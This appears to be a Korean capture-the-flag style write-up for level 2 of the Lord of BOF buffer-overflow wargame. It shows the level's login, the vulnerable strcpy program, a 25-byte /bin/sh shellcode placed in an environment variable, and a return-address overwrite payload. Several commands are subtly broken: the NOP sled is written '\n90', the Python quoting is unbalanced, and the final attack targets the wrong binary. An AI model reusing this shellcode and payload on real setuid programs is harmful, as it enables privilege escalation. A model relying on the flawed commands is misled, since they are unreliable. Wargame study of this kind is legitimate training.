# LOB 2번

#### ID : gremlin PW: hello bof world
<br>
**먼저 bash2에서 실행해야함을 기억하자** <br>

우선 cobolt.c의 내용을 보자<br>
```cat cobolt.c```<br>
```c
#include <stdio.h>

int main(int argc, char *argv[1])
{
      char buffer[16];
      if (argc < 2){
        printf("argv error\n");
        exit(0);
      }
      strcpy(buffer, argv[1]);
      printf("%s\n", buffer);
}
```
버퍼의 크기가 16으로 작아졌을 뿐 lob 1번 문제와 유사하다.
[LOB 1번 보기]()

우리의 목적을 생각해보자.<br>
1. buffer 위치 구하기
2. 환경변수 등록 후 주소 얻기
3. ret에 환경변수 주소 덮어씌우기
3. 공격!

**cobolt 코드를 디버깅해야하기 때문에 cobolt1로 복사하자.**<br>

**그리고 디버깅을 해보자**<br>
```gdb -q cobolt1```<br>
```set disassembly-flavor intel```<br>
```disas main```<br>

<main+3>을 보면 16만큼의 자리를 만들고있다.<br>
buffer에서 ebp까지의 거리가 16이라는 것이다.<br>

25byte 쉘코드를 등록해준 후 주소값을 얻는 코드를 통해 주소값을 얻자.<br>
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80<br>

```export shellcode=$(python -c 'print "\n90"*20+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')```<br>
vi에디터를 이용해 쉘 코드의 주소값을 받아오는 코드를 작성한다.<br>
```vi shell.c```<br>
```c
#include <stdio.h>

int main()
{
    printf("%p\n", getenv("shellcode"));
    return 0;
}
```
```
gcc -o shell shell.c
./shell
```
만든 코드를 실행시키면 쉘 코드의 주소값을 알 수 있다.<br>

**이제 페이로드를 작성해보자.**<br>
```../cobolt `python -c 'print "A"*20+"\x82\xfe\xff\xbf"'` ```<br>
*(주소는 little endian 방식으로 입력된다)*<br>
<br>
**공격 실시!**<br>
```../gremlin `python -c 'print "A"*20+"\x82\xfe\xff\xbf"'` ```<br>
```my-pass```로 비밀번호를 물어보면<br>
euid와 함께 비밀번호가 "~~". 라고 나올 것이다!!
